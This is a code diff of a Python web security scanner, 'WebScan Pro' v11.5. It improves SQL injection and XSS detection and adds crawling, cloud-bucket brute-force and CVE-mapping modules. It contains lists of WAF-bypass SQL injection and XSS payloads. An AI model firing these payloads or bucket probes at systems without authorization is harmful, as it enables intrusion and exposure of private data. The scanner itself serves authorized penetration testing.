@@ -27,7 +27,7 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-VERSION    = "11.4"
+VERSION    = "11.5"
 TOOL_NAME  = "WebScan Pro"
 UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 TIMEOUT    = 7
@@ -381,6 +381,19 @@ CAT_TITLES = {
     "srv_hardening":  ("🔩", "Server Hardening & CGI"),
     "info_disclosure":("📰", "Information Disclosure"),
     "zap_passive":    ("🔬", "ZAP-style Passive Analysis"),
+    "cloud_bucket":    ("☁️",  "Cloud Storage Exposure"),
+    "mass_assignment": ("📦",  "Mass Assignment"),
+    "acct_takeover":   ("🔐",  "Account Takeover"),
+    "redos":           ("⏱️",  "RegEx DoS (ReDoS)"),
+    "clickjacking":    ("🖱️",  "Clickjacking"),
+    "jsonp_inject":    ("🔗",  "JSONP Injection"),
+    "css_inject":      ("🎨",  "CSS Injection"),
+    "http2_vulns":     ("🌐",  "HTTP/2 Vulnerabilities"),
+    "cve_scan":        ("📋",  "CVE Scan (Technology)"),
+    "s3_brute":        ("🪣",  "S3 Bucket Brute-Force"),
+    "wayback_urls":    ("🕰️",  "Wayback / Archive URLs"),
+    "param_discover":  ("🔎",  "Parameter Discovery"),
+    "race_condition":  ("🏁",  "Race Condition"),
 }
 
 # ─── Terminal UI ───────────────────────────────────────────────────
@@ -570,7 +583,7 @@ def banner():
 """+Style.RESET_ALL)
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}")
     print(f"  {Fore.CYAN}  Professional Web Security Scanner{Style.RESET_ALL}  {Fore.YELLOW}v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}  57 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
+    print(f"  {Fore.WHITE}  70 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}\n")
 
 # ═══ MODULE 0 — WAF DETECTION (v9.0: 30+ signatures) ════════════
@@ -1863,33 +1876,53 @@ def sqli_scan(url):
 
     _found = threading.Event()
 
+    # v11.5: Measure baseline BEFORE any injection to prevent false positives on slow servers
+    _sqli_baseline = [3.0]  # default fallback baseline
+    try:
+        _t0 = time.time()
+        _rb = rget(url if not parsed.query else parsed._replace(query=urlencode(dict(params), doseq=True)).geturl(), timeout=TIMEOUT)
+        _sqli_baseline[0] = time.time() - _t0
+        info(f"SQLi baseline response time: {_sqli_baseline[0]:.2f}s")
+    except Exception:
+        pass
+
     def _test(param, payload, ptype):
         if _found.is_set(): return
         tp = dict(params); tp[param] = [payload]
         test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
         try:
-            t_out = 4 if ptype == "time" else TIMEOUT
-            r = rget(test_url, timeout=t_out)
-            body_low = r.text.lower()
-            for db_type, sigs in DB_ERRORS.items():
-                for sig in sigs:
-                    if sig in body_low:
-                        _found.set()
-                        vuln(f"SQLi [{db_type}] param='{param}' payload='{payload[:30]}'", "Critical")
-                        add("sqli", {"param": param, "payload": payload, "db_type": db_type,
-                            "severity": "Critical",
-                            "title": f"SQL Injection — {db_type} Error [{param}]",
-                            "description": f"DB error '{sig}' detected. Param: '{param}'. Payload: {payload[:100]}",
-                            "recommendation": "Use parameterized queries. Never concatenate user input into SQL."})
-                        return
-            if ptype == "time" and r.elapsed.total_seconds() > 2.8:
-                _found.set()
-                vuln(f"Blind SQLi (time) param='{param}' delay={r.elapsed.total_seconds():.1f}s", "Critical")
-                add("sqli", {"param": param, "payload": payload, "db_type": "Blind/Time-based",
-                    "severity": "Critical",
-                    "title": f"Blind SQL Injection (Time-based) [{param}]",
-                    "description": f"Response delayed {r.elapsed.total_seconds():.1f}s. Param: '{param}'. Payload: {payload[:100]}",
-                    "recommendation": "Use parameterized queries. Apply input validation and WAF rules."})
+            if ptype == "time":
+                # Time-based: use baseline + margin; require delay > baseline + 2.5s
+                t_out = max(TIMEOUT, _sqli_baseline[0] + 7)
+                t0 = time.time()
+                r = rget(test_url, timeout=t_out)
+                actual_delay = time.time() - t0
+                delay_above_baseline = actual_delay - _sqli_baseline[0]
+                body_low = r.text.lower()
+                if delay_above_baseline > 2.5:
+                    _found.set()
+                    vuln(f"Blind SQLi (time-based CONFIRMED) param='{param}' baseline={_sqli_baseline[0]:.1f}s delay={actual_delay:.1f}s (+{delay_above_baseline:.1f}s)", "Critical")
+                    add("sqli", {"param": param, "payload": payload, "db_type": "Blind/Time-based",
+                        "confirmed": True, "severity": "Critical",
+                        "title": f"Blind SQL Injection (Time-based CONFIRMED) [{param}]",
+                        "description": f"CONFIRMED: Response delayed {actual_delay:.1f}s vs baseline {_sqli_baseline[0]:.1f}s (+{delay_above_baseline:.1f}s above baseline). Param: '{param}'. Payload: {payload[:100]}",
+                        "recommendation": "Use parameterized queries. Apply input validation and WAF rules.",
+                        "evidence": f"Baseline: {_sqli_baseline[0]:.2f}s | Injected: {actual_delay:.2f}s | Delta: +{delay_above_baseline:.2f}s"})
+            else:
+                r = rget(test_url, timeout=TIMEOUT)
+                body_low = r.text.lower()
+                for db_type, sigs in DB_ERRORS.items():
+                    for sig in sigs:
+                        if sig in body_low:
+                            _found.set()
+                            vuln(f"SQLi [{db_type}] CONFIRMED param='{param}' payload='{payload[:30]}'", "Critical")
+                            add("sqli", {"param": param, "payload": payload, "db_type": db_type,
+                                "confirmed": True, "severity": "Critical",
+                                "title": f"SQL Injection — {db_type} Error CONFIRMED [{param}]",
+                                "description": f"CONFIRMED: DB error '{sig}' in response. Param: '{param}'. Payload: {payload[:100]}",
+                                "recommendation": "Use parameterized queries. Never concatenate user input into SQL.",
+                                "evidence": f"Error signature '{sig}' found in HTTP response body"})
+                            return
         except Exception:
             pass
 
@@ -1936,13 +1969,32 @@ def xss_scan(url):
         test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
         try:
             r = rget(test_url, timeout=TIMEOUT)
-            if payload in r.text or payload.lower() in r.text.lower():
+            body = r.text
+            # v11.5: Context verification — check payload is ACTUALLY reflected unescaped
+            # HTML-encoded versions like &lt;script&gt; are NOT exploitable
+            if payload in body:
+                # Exact match — payload reflected verbatim (confirmed)
                 _found_xss.set()
-                vuln(f"Reflected XSS param='{param}' payload='{payload[:50]}'", "High")
+                vuln(f"Reflected XSS CONFIRMED param='{param}' payload='{payload[:50]}'", "High")
                 add("xss", {"param": param, "payload": payload, "severity": "High",
-                    "title": f"Reflected XSS in Parameter '{param}'",
-                    "description": f"XSS payload reflected unescaped. Param: '{param}'. Payload: {payload[:100]}",
-                    "recommendation": "HTML-encode all user input before rendering. Implement Content-Security-Policy."})
+                    "confirmed": True,
+                    "title": f"Reflected XSS CONFIRMED — Parameter '{param}'",
+                    "description": f"CONFIRMED: XSS payload reflected verbatim (unencoded) in HTTP response. Param: '{param}'. Payload: {payload[:100]}",
+                    "recommendation": "HTML-encode all user input before rendering. Implement strict Content-Security-Policy.",
+                    "evidence": f"Payload '{payload[:60]}' found verbatim in response body"})
+            elif payload.lower() in body.lower():
+                # Case-insensitive match — check for HTML encoding
+                encoded = payload.replace("<","&lt;").replace(">","&gt;").replace('"','&quot;').replace("'","&#x27;")
+                if encoded.lower() not in body.lower():
+                    # Not encoded → still reflected but case-modified
+                    _found_xss.set()
+                    vuln(f"Reflected XSS (case-insensitive) CONFIRMED param='{param}'", "High")
+                    add("xss", {"param": param, "payload": payload, "severity": "High",
+                        "confirmed": True,
+                        "title": f"Reflected XSS CONFIRMED (case-modified) — Parameter '{param}'",
+                        "description": f"CONFIRMED: XSS payload reflected case-modified but unencoded. Param: '{param}'. Payload: {payload[:100]}",
+                        "recommendation": "HTML-encode all user input before rendering. Implement Content-Security-Policy.",
+                        "evidence": f"Case-modified payload found unencoded in response"})
         except Exception:
             pass
 
@@ -3216,13 +3268,13 @@ def build_report(target, out_dir="./reports", cvss_min=0.0):
     ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     base = os.path.join(out_dir, f"webscanpro_{ts}")
 
-    # JSON
+    # JSON — enhanced with confirmed/potential fields
     jpath = base + ".json"
     with open(jpath, "w", encoding="utf-8") as f:
         json.dump(dict(FINDINGS), f, indent=2, default=str)
     good(f"JSON report saved: {jpath}")
 
-    # HTML report
+    # HTML report (Confirmed + Potential tiers)
     hpath = base + ".html"
     try:
         _build_html(target, hpath, cvss_min)
@@ -3231,13 +3283,24 @@ def build_report(target, out_dir="./reports", cvss_min=0.0):
         import traceback as _tb
         err(f"HTML report error: {_html_err}")
         err(_tb.format_exc()[-400:])
-        # Write a minimal fallback HTML so the file still exists
         with open(hpath, "w", encoding="utf-8") as _f:
             _f.write(f"<html><body><h1>WebScan Pro — Report Error</h1>"
                      f"<pre>{_html_err}</pre>"
                      f"<p>See JSON report: {jpath}</p></body></html>")
         warn(f"Fallback HTML saved: {hpath}")
-    return hpath, jpath
+
+    # Expert Validation Report (4th report — Critical/High manual verification)
+    expert_path = base + "_expert.html"
+    try:
+        _build_expert_report(target, expert_path)
+        good(f"Expert Validation Report saved: {expert_path}")
+    except Exception as _exp_err:
+        import traceback as _tb3
+        err(f"Expert report error: {_exp_err}")
+        err(_tb3.format_exc()[-400:])
+        expert_path = None
+
+    return hpath, jpath, expert_path
 
 def _build_html(target, hpath, cvss_min=0.0):
     counts = _sev_counts()
@@ -3268,25 +3331,34 @@ def _build_html(target, hpath, cvss_min=0.0):
     chart_data   = [counts.get(s,0) for s in chart_labels]
     chart_colors = ["#e74c3c","#e67e22","#f1c40f","#3498db","#95a5a6"]
 
-    rows_html = ""
-    for f in all_findings:
-        sev = f.get("severity","Info")
-        col_map = {"Critical":"#e74c3c","High":"#e67e22","Medium":"#f1c40f","Low":"#3498db","Info":"#95a5a6"}
-        col = col_map.get(sev,"#95a5a6")
-        title = f.get("title", f.get("url", f.get("path","Finding")))
-        desc  = f.get("description","")
-        rec   = f.get("recommendation","")
-        owasp = f.get("_owasp","")
-        owasp_name = f.get("_owasp_name","")
-        cwe   = f.get("_cwe","")
-        cvss  = f.get("_cvss",0.0)
-        biz   = f.get("_biz","")
-        label = f.get("_label","")
-        icon  = f.get("_icon","🔍")
-        rows_html += f"""
+    # v11.5: Split findings into Confirmed and Potential tiers
+    confirmed_findings  = [f for f in all_findings if f.get("confirmed", False)]
+    potential_findings  = [f for f in all_findings if not f.get("confirmed", False)]
+
+    def _render_findings(findings_list):
+        rows = ""
+        for f in findings_list:
+            sev = f.get("severity","Info")
+            col_map = {"Critical":"#e74c3c","High":"#e67e22","Medium":"#f1c40f","Low":"#3498db","Info":"#95a5a6"}
+            col = col_map.get(sev,"#95a5a6")
+            title = f.get("title", f.get("url", f.get("path","Finding")))
+            desc  = f.get("description","")
+            rec   = f.get("recommendation","")
+            evid  = f.get("evidence","")
+            owasp = f.get("_owasp","")
+            owasp_name = f.get("_owasp_name","")
+            cwe   = f.get("_cwe","")
+            cvss  = f.get("_cvss",0.0)
+            biz   = f.get("_biz","")
+            label = f.get("_label","")
+            icon  = f.get("_icon","🔍")
+            is_confirmed = f.get("confirmed", False)
+            conf_badge = '<span class="conf-badge confirmed">✅ CONFIRMED</span>' if is_confirmed else '<span class="conf-badge potential">⚠️ POTENTIAL</span>'
+            rows += f"""
         <div class="finding" style="border-left:4px solid {col}">
           <div class="finding-header">
             <span class="badge" style="background:{col}">{sev}</span>
+            {conf_badge}
             <span class="finding-title">{icon} [{label}] {title}</span>
           </div>
           <table class="meta-table">
@@ -3295,9 +3367,19 @@ def _build_html(target, hpath, cvss_min=0.0):
             {'<tr><th>CVSS</th><td>' + str(cvss) + '</td></tr>' if cvss else ''}
           </table>
           {'<div class="detail-block"><b>Description:</b> ' + desc + '</div>' if desc else ''}
+          {'<div class="detail-block evid"><b>Evidence:</b> ' + evid + '</div>' if evid else ''}
           {'<div class="detail-block biz"><b>Business Impact:</b> ' + biz + '</div>' if biz else ''}
           {'<div class="detail-block rec"><b>Recommendation:</b> ' + rec + '</div>' if rec else ''}
         </div>"""
+        return rows
+
+    rows_html = ""
+    if confirmed_findings:
+        rows_html += '<div class="tier-header">✅ CONFIRMED VULNERABILITIES (' + str(len(confirmed_findings)) + ')</div>'
+        rows_html += _render_findings(confirmed_findings)
+    if potential_findings:
+        rows_html += '<div class="tier-header pot">⚠️ POTENTIAL VULNERABILITIES (' + str(len(potential_findings)) + ') — Require Manual Verification</div>'
+        rows_html += _render_findings(potential_findings)
 
     html = f"""<!DOCTYPE html>
 <html lang="en">
@@ -3351,7 +3433,7 @@ def _build_html(target, hpath, cvss_min=0.0):
   <div class="chart-wrap">
     <canvas id="sevChart" height="200"></canvas>
   </div>
-  <div class="findings-title">Findings ({len(all_findings)} shown{' — CVSS ≥ ' + str(cvss_min) if cvss_min else ''})</div>
+  <div class="findings-title">Findings ({len(all_findings)} total — {len(confirmed_findings)} Confirmed, {len(potential_findings)} Potential{' — CVSS ≥ ' + str(cvss_min) if cvss_min else ''})</div>
   {rows_html if rows_html else '<div class="finding"><div class="finding-header"><span class="finding-title">No findings match the current filter.</span></div></div>'}
   <div class="log-section">
     <div class="findings-title">Scan Log</div>
@@ -3587,7 +3669,7 @@ def main():
 
     info(f"Target: {url}")
     info(f"Version: WebScan Pro v{VERSION}")
-    info(f"Modules: 47  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
+    info(f"Modules: 70  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
     info(f"Sensitive paths: {len(SENSITIVE_PATHS)}  |  SSRF targets: 18")
     info(f"Output: {args.output}")
     info(f"Checkpoint: {CHECKPOINT_FILE}")
@@ -3707,17 +3789,41 @@ def main():
     else:
         info("Skipping Phase 2b+2c+2d advanced modules (--no-advanced)")
 
+    # ── PHASE 2e: v11.5 NEW MODULES (58–70) ────────────────────────
+    section("PHASE 2e — v11.5 NEW MODULES (58–70)","🆕")
+    _p2e_tasks = [
+        lambda: _run(web_crawler_scan, url),
+        lambda: _run(cloud_bucket_scan, url),
+        lambda: _run(mass_assignment_scan, url),
+        lambda: _run(account_takeover_scan, url),
+        lambda: _run(redos_scan, url),
+        lambda: _run(clickjacking_scan, url),
+        lambda: _run(jsonp_scan, url),
+        lambda: _run(css_injection_scan, url),
+        lambda: _run(http2_scan, url),
+        lambda: _run(cve_mapping_scan, url),
+        lambda: _run(s3_brute_scan, url),
+        lambda: _run(wayback_scan, url),
+        lambda: _run(param_discovery_scan, url),
+        lambda: _run(race_condition_scan, url),
+        lambda: _run(waf_bypass_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=8) as _p2e:
+        _futs2e = [_p2e.submit(t) for t in _p2e_tasks]
+        for _f in as_completed(_futs2e): _pass(_f)
+
     # ── PHASE 3: REPORTS ───────────────────────────────────────────
     section("PHASE 3 — REPORT GENERATION","📊")
     # Auto-create output directory
     os.makedirs(args.output, exist_ok=True)
     try:
-        html_path, json_path = build_report(url, out_dir=args.output, cvss_min=cvss_min)
+        html_path, json_path, expert_path = build_report(url, out_dir=args.output, cvss_min=cvss_min)
     except Exception as _rpt_err:
         err(f"Report generation failed: {_rpt_err}")
         import traceback as _tb2; err(_tb2.format_exc()[-500:])
         html_path = os.path.join(args.output, "report_error.html")
         json_path = os.path.join(args.output, "report_error.json")
+        expert_path = None
     # Burp Suite XML — only with --burp flag
     burp_path = None
     if args.burp:
@@ -3757,7 +3863,9 @@ def main():
     if burp_path:
         print(f"    {Fore.GREEN}Burp{Style.RESET_ALL} : {burp_path}")
     if pdf_path and os.path.exists(pdf_path):
-        print(f"    {Fore.GREEN}PDF {Style.RESET_ALL} : {pdf_path}")
+        print(f"    {Fore.GREEN}PDF    {Style.RESET_ALL} : {pdf_path}")
+    if expert_path and os.path.exists(str(expert_path)):
+        print(f"    {Fore.GREEN}Expert {Style.RESET_ALL} : {expert_path}")
     print(f"\n  {Fore.CYAN}Open report:{Style.RESET_ALL}")
     print(f"    firefox \"{html_path}\"")
     print(f"\n  {Fore.YELLOW}For authorized security testing only.{Style.RESET_ALL}\n")
@@ -6025,6 +6133,1818 @@ def zap_passive_scan(url):
     good("ZAP-style passive analysis complete")
     _module_done("zap_passive")
 
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  v11.5 — ENHANCED GLOBAL STRUCTURES
+# ═══════════════════════════════════════════════════════════════════════
+
+# CVE database: technology → known CVEs
+CVE_DB = {
+    "Apache": [
+        {"id":"CVE-2021-41773","cvss":9.8,"desc":"Path traversal and RCE in Apache 2.4.49"},
+        {"id":"CVE-2021-42013","cvss":9.8,"desc":"Path traversal RCE Apache 2.4.49-2.4.50"},
+        {"id":"CVE-2017-7679", "cvss":9.8,"desc":"mod_mime buffer overread"},
+        {"id":"CVE-2022-22720","cvss":9.8,"desc":"HTTP request smuggling"},
+        {"id":"CVE-2021-26691","cvss":9.8,"desc":"mod_session heap overflow"},
+    ],
+    "nginx": [
+        {"id":"CVE-2021-23017","cvss":9.4,"desc":"Off-by-one in DNS resolver (1-byte heap write)"},
+        {"id":"CVE-2019-9511", "cvss":7.5,"desc":"HTTP/2 Data Dribble DoS"},
+        {"id":"CVE-2017-7529", "cvss":7.5,"desc":"Integer overflow in range filter"},
+        {"id":"CVE-2013-2028", "cvss":7.5,"desc":"Stack-based buffer overflow in chunked transfer"},
+    ],
+    "PHP": [
+        {"id":"CVE-2022-31628","cvss":9.8,"desc":"Uncontrolled resource consumption"},
+        {"id":"CVE-2021-21705","cvss":5.3,"desc":"Insufficient FILTER_VALIDATE_URL check"},
+        {"id":"CVE-2019-11043","cvss":9.8,"desc":"PHP-FPM env_path buffer underflow → RCE"},
+        {"id":"CVE-2018-7314", "cvss":9.8,"desc":"imap_open command injection"},
+    ],
+    "WordPress": [
+        {"id":"CVE-2022-21664","cvss":8.8,"desc":"SQL injection in WP_Query"},
+        {"id":"CVE-2022-21663","cvss":8.8,"desc":"Object injection via metadata"},
+        {"id":"CVE-2021-39200","cvss":5.3,"desc":"REST API information disclosure"},
+        {"id":"CVE-2021-39201","cvss":6.4,"desc":"Admin email disclosure"},
+    ],
+    "Drupal": [
+        {"id":"CVE-2018-7600","cvss":9.8,"desc":"Drupalgeddon2 — Remote Code Execution"},
+        {"id":"CVE-2018-7602","cvss":9.8,"desc":"Drupalgeddon2 follow-up RCE"},
+        {"id":"CVE-2019-6340","cvss":9.8,"desc":"Remote code execution via REST API"},
+    ],
+    "Joomla": [
+        {"id":"CVE-2023-23752","cvss":5.3,"desc":"Improper access check on REST API"},
+        {"id":"CVE-2021-26034","cvss":7.5,"desc":"Inadequate access check in core"},
+        {"id":"CVE-2015-8562", "cvss":9.8,"desc":"Remote code execution via session data"},
+    ],
+    "OpenSSL": [
+        {"id":"CVE-2022-0778","cvss":7.5,"desc":"Infinite loop in BN_mod_sqrt — DoS"},
+        {"id":"CVE-2021-3711","cvss":9.8,"desc":"SM2 decryption buffer overflow"},
+        {"id":"CVE-2014-0160","cvss":7.5,"desc":"Heartbleed — TLS heartbeat memory leak"},
+    ],
+    "IIS": [
+        {"id":"CVE-2022-21907","cvss":9.8,"desc":"HTTP Protocol Stack remote code execution"},
+        {"id":"CVE-2021-31166","cvss":9.8,"desc":"HTTP Protocol Stack DoS"},
+        {"id":"CVE-2017-7269", "cvss":9.8,"desc":"WebDAV ScStoragePathFromUrl buffer overflow"},
+    ],
+    "Tomcat": [
+        {"id":"CVE-2020-1938","cvss":9.8,"desc":"Ghostcat — AJP file read/RCE"},
+        {"id":"CVE-2019-0232","cvss":9.8,"desc":"Remote code execution on Windows CGI"},
+        {"id":"CVE-2017-12615","cvss":8.1,"desc":"PUT method file upload"},
+    ],
+    "Django": [
+        {"id":"CVE-2022-28347","cvss":9.8,"desc":"SQL injection in QuerySet.annotate"},
+        {"id":"CVE-2021-35042","cvss":9.8,"desc":"SQL injection in QuerySet.order_by"},
+    ],
+    "Laravel": [
+        {"id":"CVE-2021-3129","cvss":9.8,"desc":"Remote code execution via Ignition debug mode"},
+    ],
+    "Spring": [
+        {"id":"CVE-2022-22965","cvss":9.8,"desc":"Spring4Shell — RCE via data binding"},
+        {"id":"CVE-2022-22963","cvss":9.8,"desc":"Spring Cloud Function RCE via SpEL"},
+        {"id":"CVE-2021-22053","cvss":9.8,"desc":"Spring Framework RCE"},
+    ],
+    "Redis": [
+        {"id":"CVE-2022-0543","cvss":10.0,"desc":"Lua sandbox escape → RCE"},
+        {"id":"CVE-2021-32761","cvss":8.8,"desc":"Integer overflow via BITFIELD"},
+    ],
+    "Elasticsearch": [
+        {"id":"CVE-2021-22144","cvss":6.5,"desc":"Uncontrolled resource consumption"},
+        {"id":"CVE-2015-1427","cvss":10.0,"desc":"Groovy sandbox escape → RCE"},
+    ],
+    "Struts": [
+        {"id":"CVE-2017-5638","cvss":10.0,"desc":"Equifax breach — RCE via Content-Type"},
+        {"id":"CVE-2018-11776","cvss":9.8,"desc":"Remote code execution without namespace"},
+    ],
+}
+
+# WAF Bypass payload variants
+WAF_BYPASS_SQLI = [
+    "' /*!OR*/ '1'='1'--",
+    "'/**/OR/**/1=1--",
+    "' OR 1=1-- -",
+    "1' /*!UNION*/ /*!SELECT*/ NULL,NULL--",
+    "1' uNiOn SeLeCt NULL,NULL--",
+    "' OR 'x'='x",
+    "';%09SELECT%09NULL--",
+    "' OR 1=1#",
+    "1' AND SLEEP(3)--",
+    "1'; WAITFOR DELAY '0:0:3'--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))A)--",
+    "' OR SLEEP(3)#",
+    "' OR pg_sleep(3)--",
+    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
+    "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
+]
+
+WAF_BYPASS_XSS = [
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<img/src='x'onerror=alert(1)>",
+    "<svg/onload=&#97;lert(1)>",
+    "<%2fscript><script>alert(1)</script>",
+    '<img src=x onerror="&#97;lert(1)">',
+    "<<script>alert(1)//<</script>",
+    "<script>\u0061lert(1)</script>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<a href=javascript:alert(1)>click</a>",
+]
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 58 — WEB CRAWLER / SPIDER
+# ═══════════════════════════════════════════════════════════════════════
+# Global crawled URLs — shared with other modules
+CRAWLED_URLS   = set()
+CRAWLED_FORMS  = []  # list of dicts {url, method, params}
+CRAWLED_PARAMS = {}  # url → list of params found
+
+def web_crawler_scan(url):
+    """Spider the target site to discover endpoints, forms, and parameters."""
+    if _module_skip("crawler"): info("Skipping Crawler (already done)"); return
+    section("MODULE 58 — WEB CRAWLER / SPIDER","🕷️")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    domain = parsed.netloc
+
+    visited = set()
+    to_visit = {url}
+    max_pages = 60  # limit for performance
+    forms_found = []
+
+    try:
+        from html.parser import HTMLParser
+
+        class _LinkParser(HTMLParser):
+            def __init__(self):
+                super().__init__()
+                self.links  = []
+                self.forms  = []
+                self._form  = None
+
+            def handle_starttag(self, tag, attrs):
+                a = dict(attrs)
+                if tag == "a" and a.get("href"):
+                    self.links.append(a["href"])
+                elif tag == "form":
+                    self._form = {"method": a.get("method","get").upper(),
+                                  "action": a.get("action",""), "inputs": []}
+                elif tag in ("input","textarea","select") and self._form is not None:
+                    name = a.get("name")
+                    if name:
+                        self._form["inputs"].append({"name": name,
+                                                      "type": a.get("type","text"),
+                                                      "value": a.get("value","")})
+
+            def handle_endtag(self, tag):
+                if tag == "form" and self._form is not None:
+                    self.forms.append(self._form)
+                    self._form = None
+
+        while to_visit and len(visited) < max_pages:
+            current = to_visit.pop()
+            if current in visited: continue
+            visited.add(current)
+
+            try:
+                r = rget(current, timeout=TIMEOUT, allow_redirects=True)
+                if "text/html" not in r.headers.get("Content-Type",""):
+                    continue
+
+                parser = _LinkParser()
+                parser.feed(r.text)
+
+                # Process links
+                for href in parser.links:
+                    abs_url = urljoin(current, href)
+                    p = urlparse(abs_url)
+                    if p.netloc == domain and abs_url not in visited:
+                        # Only follow same-domain links
+                        to_visit.add(abs_url.split("#")[0])  # strip fragment
+
+                # Process forms
+                for form in parser.forms:
+                    action = urljoin(current, form["action"]) if form["action"] else current
+                    p = urlparse(action)
+                    if p.netloc == domain or not form["action"]:
+                        forms_found.append({
+                            "url": action,
+                            "method": form["method"],
+                            "params": [i["name"] for i in form["inputs"]],
+                        })
+
+                # Extract query params
+                qparams = parse_qs(urlparse(current).query)
+                if qparams:
+                    CRAWLED_PARAMS[current] = list(qparams.keys())
+
+            except Exception:
+                pass
+
+        # Store globally for other modules
+        CRAWLED_URLS.update(visited)
+        CRAWLED_FORMS.extend(forms_found)
+
+        info(f"Crawler: {len(visited)} pages visited")
+        info(f"Crawler: {len(forms_found)} forms found")
+        info(f"Crawler: {len(CRAWLED_PARAMS)} URLs with parameters")
+
+        if forms_found:
+            add("param_discover", {
+                "severity": "Info",
+                "confirmed": True,
+                "title": f"Web Crawler: {len(visited)} Pages Discovered, {len(forms_found)} Forms",
+                "description": f"Crawler mapped {len(visited)} unique URLs and found {len(forms_found)} HTML forms with {sum(len(f['params']) for f in forms_found)} total input fields.",
+                "recommendation": "Review all discovered forms for injection vulnerabilities. Remove unused endpoints.",
+                "url": url,
+                "evidence": f"Endpoints: {len(visited)} | Forms: {len(forms_found)}",
+            })
+
+        # Report interesting URLs found
+        interesting_paths = [u for u in visited if any(x in u.lower() for x in
+                             ["/admin","/api/","/backup","/upload","/debug","/config","/login",
+                              "/password","/reset","/register","/signup","/dashboard","/graphql",
+                              "/swagger","/actuator","/phpinfo","/env","/health"])]
+        if interesting_paths:
+            warn(f"Crawler found {len(interesting_paths)} interesting endpoints")
+            add("param_discover", {
+                "severity": "Medium",
+                "confirmed": True,
+                "title": f"Crawler: {len(interesting_paths)} Sensitive Endpoints Discovered",
+                "description": f"Spider found potentially sensitive paths: {', '.join(interesting_paths[:10])}",
+                "recommendation": "Audit each discovered sensitive endpoint for authentication and authorization controls.",
+                "url": url,
+                "evidence": " | ".join(interesting_paths[:5]),
+            })
+
+    except Exception as e:
+        info(f"Crawler error: {e}")
+
+    good("Web crawler complete")
+    _module_done("crawler")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 59 — CLOUD STORAGE EXPOSURE (S3 / GCS / Azure)
+# ═══════════════════════════════════════════════════════════════════════
+def cloud_bucket_scan(url):
+    if _module_skip("cloud_bucket"): return
+    section("MODULE 59 — CLOUD STORAGE EXPOSURE","☁️")
+
+    parsed  = urlparse(url)
+    domain  = parsed.hostname or ""
+    # Strip TLD/subdomains to get company name variants
+    parts   = domain.split(".")
+    company = parts[-2] if len(parts) >= 2 else parts[0]
+    # Sanitize company name
+    company = re.sub(r"[^a-z0-9-]", "", company.lower())
+
+    # Bucket name variants to try
+    variants = [
+        company, f"{company}-backup", f"{company}-data", f"{company}-files",
+        f"{company}-assets", f"{company}-media", f"{company}-uploads",
+        f"{company}-static", f"{company}-images", f"{company}-logs",
+        f"{company}-dev", f"{company}-staging", f"{company}-prod",
+        f"{company}-public", f"{company}-private", f"{company}-storage",
+        f"backup-{company}", f"static-{company}", f"assets-{company}",
+        f"{company}backup", f"{company}files", f"{company}data",
+    ]
+
+    # S3 bucket URL patterns
+    s3_patterns = [
+        "https://{}.s3.amazonaws.com/",
+        "https://s3.amazonaws.com/{}/",
+        "https://{}.s3.us-east-1.amazonaws.com/",
+        "https://{}.s3.eu-west-1.amazonaws.com/",
+    ]
+    # GCS patterns
+    gcs_patterns = [
+        "https://storage.googleapis.com/{}/",
+        "https://{}.storage.googleapis.com/",
+    ]
+    # Azure patterns
+    azure_patterns = [
+        "https://{}.blob.core.windows.net/",
+        "https://{}.blob.core.windows.net/$web/",
+    ]
+
+    # Also check if the target site references cloud buckets in its HTML
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        body = r.text
+        # Find any S3/GCS/Azure bucket references
+        s3_refs = re.findall(r'(https?://[a-z0-9.-]+\.s3(?:\.[a-z0-9-]+)?\.amazonaws\.com[/\w.-]*)', body, re.I)
+        gcs_refs = re.findall(r'(https?://(?:storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9._-]+\.storage\.googleapis\.com)[/\w.-]*)', body, re.I)
+        az_refs  = re.findall(r'(https?://[a-z0-9]+\.blob\.core\.windows\.net[/\w.-]*)', body, re.I)
+
+        all_refs = list(set(s3_refs + gcs_refs + az_refs))
+        if all_refs:
+            warn(f"Found {len(all_refs)} cloud storage references in page source")
+            for ref_url in all_refs[:5]:
+                try:
+                    r2 = rget(ref_url, timeout=5)
+                    if r2.status_code == 200:
+                        vuln(f"Publicly accessible cloud storage: {ref_url}", "High")
+                        add("cloud_bucket", {
+                            "severity": "High",
+                            "confirmed": True,
+                            "title": f"Publicly Accessible Cloud Storage Bucket",
+                            "description": f"Cloud storage bucket is publicly readable: {ref_url}. Data in this bucket is accessible without authentication.",
+                            "recommendation": "Set bucket ACL to private. Use IAM policies. Enable server-side access logging.",
+                            "url": ref_url,
+                            "evidence": f"HTTP {r2.status_code} returned {len(r2.text)} bytes from {ref_url}",
+                        })
+                    elif r2.status_code == 403:
+                        info(f"Cloud bucket exists but access denied: {ref_url}")
